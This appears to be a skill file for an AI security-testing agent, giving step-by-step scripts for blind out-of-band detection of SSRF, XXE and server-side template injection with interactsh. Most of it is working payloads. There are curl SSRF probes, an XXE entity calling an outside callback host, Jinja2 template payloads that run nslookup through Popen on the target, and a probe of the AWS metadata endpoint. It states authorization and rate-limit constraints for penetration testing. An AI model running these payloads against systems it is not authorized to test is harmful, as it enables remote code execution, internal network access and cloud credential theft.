---
name: oob-detection
description: Blind out-of-band (OOB) detection for SSRF, XXE, SSTI, and blind injection vulnerabilities. Uses interactsh-client as the OOB listener. Tests one parameter at a time with a unique correlation token. Run on T1 endpoints after dark-recon or url-discovery identifies injectable parameters.
compatibility: Bash, add_hint, task context.
---

# OOB Detection — Blind Injection via interactsh

Use when parameters exist but no direct feedback confirms injection (blind SSRF, blind XXE, SSTI in email templates, blind SQLi time-based, LDAP injection). Each probe uses a unique subdomain on interactsh so DNS/HTTP callbacks can be correlated to the exact parameter that triggered them.

## Prerequisites

- `interactsh-client` binary in PATH (`/home/bobby/go/bin/interactsh-client`)
- A live target URL with parameters identified (from `url-discovery` or manual recon)
- Explicit authorization for the target

---

## Step 1 — Start the OOB listener

```bash
OUTDIR="/tmp/oob-$(date +%s)"
mkdir -p "$OUTDIR"

# Start interactsh-client in background, log interactions to file
interactsh-client \
    -server oast.pro \
    -v \
    -o "$OUTDIR/interactions.jsonl" \
    -json \
    &
LISTENER_PID=$!

# Give it 3 seconds to register and print our correlator host
sleep 3

echo "[+] OOB listener running (PID $LISTENER_PID)"
echo "[!] Note: interactsh-client prints the unique host on startup."
echo "[!] Capture it and set: OOB_HOST=<your-id>.oast.pro"
```

Set the OOB host from the output:
```bash
OOB_HOST="<your-interaction-id>.oast.pro"
```

---

## Step 2 — SSRF probes

For each URL parameter that takes a URL, hostname, or path:

```bash
TARGET_URL="https://api.target.com/fetch"
PARAM="url"

# Generate a unique token per parameter to correlate hits
TOKEN=$(head -c 8 /dev/urandom | xxd -p)
PROBE_HOST="${TOKEN}.${OOB_HOST}"

# HTTP SSRF probe
curl -sk -o /dev/null -w "%{http_code}" \
    "${TARGET_URL}?${PARAM}=http://${PROBE_HOST}/ssrf-test" \
    --max-time 10

sleep 2

# HTTPS probe (some servers only follow HTTPS)
curl -sk -o /dev/null -w "%{http_code}" \
    "${TARGET_URL}?${PARAM}=https://${PROBE_HOST}/ssrf-https" \
    --max-time 10

sleep 2

# DNS-only probe (tests blind DNS lookup even without HTTP)
curl -sk -o /dev/null -w "%{http_code}" \
    "${TARGET_URL}?${PARAM}=dns://${PROBE_HOST}" \
    --max-time 10

echo "[*] SSRF probes sent for param '$PARAM', token: $TOKEN"
echo "[*] Watching for interaction on: $PROBE_HOST"
sleep 5
```

Common SSRF parameter names to try: `url`, `uri`, `src`, `href`, `redirect`, `next`, `return`, `callback`, `webhook`, `endpoint`, `host`, `proxy`, `fetch`, `load`, `image`, `file`, `path`

---

## Step 3 — XXE probe

For endpoints that accept XML input:

```bash
TARGET_URL="https://api.target.com/import"
TOKEN=$(head -c 8 /dev/urandom | xxd -p)
PROBE_HOST="${TOKEN}.${OOB_HOST}"

XXE_PAYLOAD="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM \"http://${PROBE_HOST}/xxe\">
]>
<root><data>&xxe;</data></root>"

curl -sk -o "$OUTDIR/xxe_response.txt" -w "%{http_code}\n" \
    -X POST "$TARGET_URL" \
    -H "Content-Type: application/xml" \
    -d "$XXE_PAYLOAD" \
    --max-time 15

echo "[*] XXE probe sent, token: $TOKEN"
sleep 5
```

---

## Step 4 — SSTI probe (email/template context)

For user-controlled strings that appear in emails, PDFs, or rendered templates:

```bash
TOKEN=$(head -c 8 /dev/urandom | xxd -p)
PROBE_HOST="${TOKEN}.${OOB_HOST}"

# Jinja2 / Twig / Tornado — nslookup variant for blind OOB
SSTI_PAYLOADS=(
    "{{''.__class__.__mro__[1].__subclasses__()[414](['nslookup','${PROBE_HOST}'],stdout=-1).communicate()}}"
    "{% for x in ().__class__.__base__.__subclasses__() %}{% if x.__name__ == 'Popen' %}{{x(['nslookup','${PROBE_HOST}'],stdout=-1,stderr=-1).communicate()}}{% endif %}{% endfor %}"
)

for payload in "${SSTI_PAYLOADS[@]}"; do
    curl -sk -o /dev/null -w "%{http_code}" \
        -X POST "https://target.com/api/notify" \
        -H "Content-Type: application/json" \
        -d "{\"message\": \"$payload\"}" \
        --max-time 10
    sleep 3
done

echo "[*] SSTI probes sent, token: $TOKEN"
```

---

## Step 5 — Wait and collect interactions

```bash
# Wait 30 seconds for delayed callbacks
echo "[*] Waiting 30s for OOB callbacks..."
sleep 30

# Check for hits
if [ -s "$OUTDIR/interactions.jsonl" ]; then
    echo "[!] OOB INTERACTIONS RECEIVED:"
    cat "$OUTDIR/interactions.jsonl"
    echo ""
    echo "[!] CONFIRMED OOB — analyze token to identify vulnerable parameter"
else
    echo "[ ] No OOB interactions detected in 30s window"
fi

kill $LISTENER_PID 2>/dev/null
```

---

## Step 6 — Correlate and escalate

```bash
python3 -I skills/oob-detection/scripts/correlate.py \
    "$OUTDIR/interactions.jsonl" \
    "$OUTDIR/probe_log.json" \
    "$OUTDIR/confirmed_oob.json"
```

For each confirmed OOB hit:
1. Record the **exact payload** and **parameter** that triggered it
2. Capture the full request/response pair
3. Add a finding: `add_hint` with type=SSRF/XXE/SSTI, severity=High (SSRF/XXE) or Critical (RCE/SSTI)
4. Note it as PROBABLE pending validator review — OOB hit confirms outbound, but impact depth needs verification

---

## Gate Before Reporting

Before escalating as a confirmed finding, verify:

1. **The interaction matches the token** — not a coincidental hit from another probe
2. **The callback is from the target server IP range** — not from your own scanner
3. **Reproduce at least once from a clean state** — fluke DNS resolution vs genuine SSRF
4. **Assess internal impact** — can you reach AWS metadata (169.254.169.254)? Internal services?

```bash
# Try AWS metadata if initial OOB confirmed
curl -sk "https://api.target.com/fetch?url=http://169.254.169.254/latest/meta-data/" \
    --max-time 10
```

---

## Constraints

- **One probe per parameter** — do not flood; each has a unique token for correlation
- **3-second minimum delay** between probes
- **No DoS payloads** — probes must be single-request, non-looping
- **No /etc/passwd or credential file reads** on first pass — establish OOB callback first, escalate only with explicit approval
- **Always stop listener after testing** — do not leave `interactsh-client` running indefinitely
- **OOB host must be `oast.pro` or self-hosted** — never use `dnslog.cn` for real engagements

## Tools Required

| Tool | Purpose |
|------|---------|
| `interactsh-client` | OOB listener + correlation host |
| `curl` | Send payloads |
| Python 3 | Interaction correlation |
